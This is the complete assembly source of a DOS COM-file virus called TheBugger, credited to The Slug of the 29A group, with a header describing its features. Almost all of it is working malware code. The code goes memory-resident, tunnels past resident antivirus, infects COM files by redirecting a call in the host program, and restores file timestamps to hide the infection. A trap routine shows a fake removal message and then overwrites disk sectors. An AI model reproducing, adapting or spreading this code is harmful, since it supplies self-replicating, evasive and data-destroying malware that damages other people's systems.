;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±±                                                                      ±±±
;±±±    ðððððð ðð ðð ððððð  ðððð  ðð ðð ððððð ððððð ððððð ððððð           ±±±
;±±±      ðð   ððððð ðð=    ð==ð  ðð ðð ðð    ðð    ðð=   ðð  ð           ±±±
;±±±      ðð   ðð ðð ðð     ð   ð ðð ðð ðð ðð ðð ðð ðð    ðððð            ±±±
;±±±      ðð   ðð ðð ððððð  ððððð ððððð ððððð ððððð ððððð ðð  ð  VIRUS.   ±±±
;±±±                                                                      ±±±
;±±±              ¯¯¯ A 29A Research Code by The Slug. ®®®                ±±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±± TheBugger   is   a   simple   COM  infector  with  some  interesting ±±±
;±±± inprovements.                                                        ±±±
;±±±                                                                      ±±±
;±±± Its  first difference with a normal COM virus is the tricky resident ±±±
;±±± check;  it's  designed  to avoid lamers writing the typical resident ±±±
;±±± program  wich returns the residency code and forces the virus to not ±±±
;±±± install  in memory. To avoid that, the virus makes an extra check of ±±±
;±±± a random byte in the memory  copy; if the check fails, it jumps to a ±±±
;±±± simulated HD formatting routine }:).                                 ±±±
;±±±                                                                      ±±±
;±±± Another  interesting feature  is  the tunneling routine. It uses the ±±±
;±±± common  code trace method but it starts tracing from PSP call to int ±±±
;±±± 21h instead of doing it from normal int 21h vector in order to avoid ±±±
;±±± resident antivirus  stopping  trace mode. This call is supported for ±±±
;±±± compatibility  with  older  DOS  versions  and  it  has  some little ±±±
;±±± diferences with  the normal int 21 handler: first, the function code ±±±
;±±± is  passed in  cl  register  (not  in  ah  as usual) and second, the ±±±
;±±± function  to  call  can't  be higher  than 24h. These diferences are ±±±
;±±± handled  by the O.S. in a separated routine and then it jumps to the ±±±
;±±± original  int 21h  handler,  so the tunneling routine only skips the ±±±
;±±± first 'compatibility' routines and gets the real int 21h address €:).±±±
;±±±                                                                      ±±±
;±±± The last big feature, is the infection method; the virus infects COM ±±±
;±±± files  by changing a call in host code to point to it. This call may ±±±
;±±± be one between  the second and  fifth. This is done  by intercepting ±±±
;±±± the int 21h service 4bh (exec), when a COM file is executed, the vi- ±±±
;±±± rus changes its  first word with an int CDh call, it intercepts this ±±±
;±±± int and jumps to the int 21h. When the host  starts running, it exe- ±±±
;±±± cutes the int CDh and then the virus takes control; it restores host ±±±
;±±± first word and changes int 01h to trace host in order to find a call ±±±
;±±± to  infect  }:) The use of int CDh can be avoided by tracing int 21h ±±±
;±±± until  host  code, but this way we have the same problem of resident ±±±
;±±± antivirus.                                                           ±±±
;±±±                                                                      ±±±
;±±± And that's all folks :), enjoy it.                                   ±±±
;±±±                                                                      ±±±
;±±±                                                                9    ±±±
;±±±   The Slug/29A                                             };){|0D==8±±±
;±±±   I Love This Job.                                         3---ë-----±±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

.286
code segment 'TheBugger'
assume cs:code,ds:code,ss:code
org 0h

virsize  equ (virend-start)+1

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Main C0de ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

start:  push cs                        ;address t0 return t0 h0st.
        db   68h                       ;push '0ffset'.
        retonno dw 0000

        push ds es
        pusha

        call sig                       ;get nasty delta 0ffset.
sig:    pop  si
        sub  si, offset(sig)

        mov  ax, 0B0B0h                ;resident check.
        int  21h
        cmp  ax, 0BABAh
        jne  instal
        jmp  lstchk

instal: mov  ah, 62h                   ;get PSP segment.
        int  21h
        xchg bx,ax                     ;get MCB addres.
        dec  ax
        mov  ds,ax

        cmp  byte ptr ds:[0],'Z'       ;is the last MCB?
        je   chgmcb
        jmp  aprog

chgmcb: sub  word ptr ds:[3],(virsize/10h)+8   ;change bl0ck size in MCB
        sub  word ptr ds:[12h],(virsize/10h)+8 ;& in PSP.
        add  ax,ds:[3]
        inc  ax

        cld                            ;copy to new l0cati0n.
        mov  es, ax
        xor  di, di
        push cs
        pop  ds
        mov  cx, virsize
    rep movsb

        push es                        ;jump t0 c0py.
        push offset(newcpy)
        retf

newcpy: mov  si, 06h                   ;m0ve call t0 int 21,
        lea  di, PSPcall+1             ;fr0m PSP t0 c0py 0f virus.
        movsw
        movsw

        mov  ds, cx                    ;save curent int 21h vect0r.
        mov  si,21h*4                  ;) cx=0
        lea  di,int21+1
        movsw
        movsw

        mov  word ptr ds:[01h*4], offset(tunn) ;hang tunneling code :)
        mov  word ptr ds:[01h*4]+2, es

        pushf                          ;call int 21h fr0m PSP in trace m0de.
        pop  ax
        or   ah, 01h
        push ax
        mov  cl, 0Bh                   ;get input status function (in cl ;).
        popf
        call PSPcall

        mov  word ptr [si-4], offset(hdl21)   ;hang new int 21h handler.
        mov  word ptr [si-2], es

aprog:  popa                           ;return t0 h0st.
        pop  es ds
        retf

lstchk: in   ax, 40h                   ;check rand0m w0rd of mem0ry c0py.
        and  ax, 0200h
        push si
        add  si, ax
        mov  di, ax
        cmpsw
        pop  si
        je aprog

buuuhh: push cs                        ;display funny message :)
        pop  ds
        lea  dx, joke
        add  dx, si
        mov  ah,09h
        int  21h

        mov  dx,0180h                  ;I think it's clear enought };).
        mov  cx,07FFh
funny:  mov  ax,0401h
        int  13h
        loop funny

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Data ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

credits  db  'TheBugger virus by The Slug/29A'
intCD:   int 0CDh                      ;int t0 detect h0st execution.
PSPcall: db  9Ah
         dd  0                         ;PSP call t0 int21h ;)
joke     db  'Removing virus from memory...',13,10,'$'

;±±±±±±±±±±±±±±±±±±±±±±±±±±±± Int 21h Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

hdl21:  cmp  ax, 0B0B0h                ;resident service?
        jne  func2
        mov  ax,0BABAh
        push cs                        ;return virus segment in es
        pop  es                        ;f0r extra check.
        iret

func2:  cmp  ax, 4B00h                 ;exec service?
        je   exec

int21:  db   0EAh                      ;jmp t0 int 21h.
        dd   0

exec:   push ds es
        pusha
        pushf

        mov  si, dx                    ;c0py filespec.
        push cs
        pop  es
        lea  di, path
next:   lodsb
        stosb
        cmp  al, 0
        jne  next

        sub  si, 4                     ;is a .c0m file?
        lodsw
        xor  ax, 2020h
        cmp  ax, 'oc'
        jne  nocom

        call chgattr                   ;change file attributes.

        mov  ax, 3D02h                 ;0pen file.
        int  03h
        xchg bx, ax

        call getdate                   ;get file time & date.

        lea  dx, firstb                ;read first 3 bytes 0f file
        mov  cx, 3                     ;t0 exe check & h0st detect rutine.
        mov  ah, 3Fh
        int 03h

        cmp  word ptr cs:firstb, 'ZM'  ;is an exe file (MZ sign)?
        je   exit

        xor  cx, cx                    ;g0 t0 file start again.
        mov  ax, 4200h
        cwd                            ;dx <- 0 ;)
        int  03h

        lea  dx, intCD                 ;write 'int CDh' c0de 0n file start
        mov  cx, 2                     ;t0 detect h0st execution.
        mov  ah, 40h
        int  03h


        xor  ax, ax                    ;change int CDh vect0r
        mov  es, ax                    ;f0r h0st detection.
        mov  ax, es:[0CDh*4]
        mov  intcddes, ax
        mov  ax, es:[0CDh*4]+2
        mov  intcdseg, ax
        mov  es:[0CDh*4], offset(fndhst)
        mov  es:[0CDh*4]+2, cs

exit:   mov  ah, 3Eh                   ;cl0se file.
        int  03h

nocom:  popf
        popa
        pop  es ds
        jmp  int21

;±±±±±±±±±±±±±±±±±±±±±±±±±±± First Int 01 Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±

tunn:   push ds es bp                  ;trace int 21 f0r tunneling.
        pusha

        call getret                    ;get next instructi0n address in es:di.

        cmp  es:[di], 0FC80h           ;is an 'cmp ax, ??'
        jne  fuera
        cmp  byte ptr es:[di+2], 24h   ;avoid 'cmp ax, 24h'
        je   fuera

stop:   xor  bx, bx
        mov  es, bx
        mov  es:[03h*4], di            ;make int 03h point to true int 21h ;)
        mov  es:[03h*4]+2, ax

        lodsw                          ;trace m0de 0ff.
        and  ah, 0FEh
        mov  [si-2], ax

fuera:  popa
        pop  bp es ds
        iret

;±±±±±±±±±±±±±±±±±±±±±±±±±±±± Int CDh Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

fndhst: push ds es bp                  ;detect h0st c0de at exec.
        pusha

        call getret                    ;get next instructi0n dir.

chkhst: cmp  di, 102h                  ;ensure it's h0st start :)
        jne  nohost

        push cs
        pop  ds

        mov  ax, word ptr firstb       ;rest0re first h0st w0rd in mem0ry.
        dec  di
        dec  di
        stosw

        lea  dx, path                  ;0pen file.
        push dx
        mov  ax, 3D02h
        int  21h
        xchg bx, ax

        lea  dx, firstb                ;rest0re first w0rd 0f file.
        mov  cx, 2
        mov  ah, 40h
        int  21h

        call setdate                   ;rest0re file date & time.
        mov  ah ,3Eh                   ;cl0se file.
        int  21h
        pop  dx
        call setattr                   ;rest0re file attributes.

        xor  ax, ax                    ;rest0re int CDh vect0r.
        mov  es, ax
        mov  ax, intcddes
        mov  es:[0CDh*4], ax
        mov  ax, intcdseg
        mov  es:[0CDh*4]+2, ax


        mov  word ptr es:[01h*4], offset(fndcal) ;change int 01h vect0r
        mov  es:[01h*4]+2, cs                    ;t0 find a call.

        mov  numinstr, 0FFh            ;max number 0f instr. t0 trace.

        in   ax, 40h                   ;ramd0m ch0se 0f call t0 infect (2-5).
        and  al, 03h
        inc  al
        inc  al
        mov  numcall, al

        push ss                        ;rest0re 0riginal IP (100h) 0n stack.
        pop  ds
        dec  di
        dec  di
        mov  [si-4], di

        lodsw                          ;trace m0de 0n
        or   ah, 01h
        mov  ss:[si-2], ax

nohost: popa
        pop  bp es ds
        iret

;±±±±±±±±±±±±±±±±±±±±±±±±±±± Second Int 01 Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±

fndcal: push ds es bp                  ;trace h0st t0 find a call t0 infect.
        pusha

        dec  cs:numinstr               ;check instructi0n trace limit.
        jnz  goon
        jmp  off

goon:   call getret                    ;get ret address.

        cmp  di, cs:lstdsp             ;d0 n0t c0unt 0ne m0re instructi0n
        jne  norep                     ;0n 'rep' prefixed instructi0ns.
        inc  cs:numinstr

norep:  mov  cs:lstdsp, di             ;st0re actual return 0ffset.

        mov  ax, es:[di]

        cmp  al, 9Dh                   ;check f0r a p0pf.
        jne  chkirt
        lodsw
        lodsw
        or   ah, 01h                   ;ensure trap flag will be 0n.
        mov  [si-2], ax
        jmp  nocall

chkirt: cmp  al, 0CFh                  ;check f0r a iret.
        jne  chkint
        lodsw
        lodsw
        lodsw
        lodsw
        or   ah, 01h                   ;ensure trap flag will be 0n.
        mov  [si-2], ax
anocall:jmp  nocall

chkint: cmp  al, 0CDh                  ;check f0r a int xx.
        jne  chkint3
        cmp  ah, 20h                   ;skip ints 20h, 21h & 20h
        je   anocall
        cmp  ah, 21h
        je   anocall
        cmp  ah, 27h
        je   anocall

        mov  cs:numint, ax             ;int number t0 perf0rm call.

        inc  di                        ;inc ret addr t0 step 0ver int call.
        inc  di
        mov  [si-4], di

        popa
        pop  bp es ds
        numint  dw 00                  ;perf0rm int call in virus c0de.
        iret

chkint3:cmp  al, 0CCh                  ;check int 03h call.
        jne  chkcal
        inc  di
        mov  [si-4], di                ;step 0ver int call.
        jmp  nocall

chkcal: cmp  al, 0E8h                  ;check f0r a call t0 infect.
        je   found
        jmp  nocall

found:  dec  cs:numcall                ;it's the nice 0ne ;)
        je   go
        cmp  cs:numinstr, 20           ;d0n't be s0 extrict in call number
        jb   go                        ;if there are t00 few calls.
        jmp  nocall

go:     call chgattr                   ;change attributes.

        mov  ax, 3D02h                 ;0pen file.
        int  03h
        xchg bx, ax

        call getdate                   ;get file date & time.

        xor  cx, cx                    ;m0ve t0 file call positi0n.
        mov  dx, di
        sub  dx, 100h
        mov  ax, 4200h
        int  03h

        lea  dx, check                 ;read call fr0m file f0r c0mpress chk.
        mov  cx, 1
        mov  ah, 3Fh
        int  03h

        cmp  check, 0E8h               ;c0mpressed file?
        je   ok
        jmp  close

ok:     xor  cx, cx                    ;m0ves t0 end 0f file.
        mov  ax, 4202h
        cwd                            ;dx <- 0 ;)
        int  03h
        mov  hostsize, ax

        sub  ax, di                    ;find call parameter.
        add  ax, 0FDh
        mov  hostsize, ax              ;f0r a new "call hostsize".

        mov  ax, es:[di+1]             ;0ffset t0 return t0 h0st
        add  ax, di
        add  ax, 3
        mov  retonno, ax

        lea  dx, start                 ;save mi c0de at file end.
        mov  cx, virsize
        mov  ah, 40h
        int  03h

        xor  cx, cx                    ;m0ves again t0 call.
        sub  di, 0FFh
        mov  dx, di
        mov  ax, 4200h
        int  03h

        lea  dx, hostsize              ;change it. }:)
        mov  cx, 2
        mov  ah, 40h
        int  03h

close:  call setdate                   ;rest0re file time & date.

        mov  ah, 3Eh                   ;cl0se file.
        int  03h

        lea  dx, path
        call setattr                   ;rest0re file attributes.

off:    mov  bp, sp
        mov  ax, ss:[bp+26]            ;trace m0de 0ff.
        and  ah, 0FEh
        mov  ss:[bp+26], ax

nocall: popa
        pop  bp es ds
        iret

;±±±±±±±±±±±±±±±±±±±±±±± Get Ret Address Fr0m Stack ±±±±±±±±±±±±±±±±±±±±±±±±±

getret: mov  si, sp                    ;get next instructi0n dir.
        add  si, 24
        push ss
        pop  ds
        lodsw
        mov  di, ax
        lodsw
        mov  es, ax
        ret

;±±±±±±±±±±±±±±±±±±±±±±±± S0me File Handling C0de ±±±±±±±±±±±±±±±±±±±±±±±±±±±

chgattr:push cs
        pop  ds
        lea  dx, path
        mov  ax,4300h                  ;change file attributes.
        int  03h
        mov  attrib,cx
        xor  cx, cx                    ;reset file atributes.
        mov  ax,4301h
        int  03h
        ret

setattr:mov  cx, attrib                ;rest0re file attributes.
        mov  ax,4301h
        int  03h
        ret

getdate:mov  ax,5700h                  ;get file time & date.
        int  03h
        mov  time,cx
        mov  date,dx
        ret

setdate:mov  cx,time                   ;rest0re file time & date.
        mov  dx,date
        mov  ax,5701h
        int  03h
        ret
virend:

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Virtual Data ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

firstb   db 3 dup(0)                   ;buffer f0r h0st start.
lstdsp   dw 0                          ;last trace 0ffset.
numinstr db 0                          ;max. number 0f instructi0ns t0 trace.
numcall  db 0                          ;call t0 infect (2-5).
intcddes dw 0                          ;int CD vect0r backup.
intcdseg dw 0
hostsize dw 0                          ;it's just the h0st size ;)
attrib   dw 0                          ;file attributes.
time     dw 0                          ;file time.
date     dw 0                          ;file date.
check    db 0                          ;check f0r compressed file.
path     db 0                          ;path to host.

code ends
end start
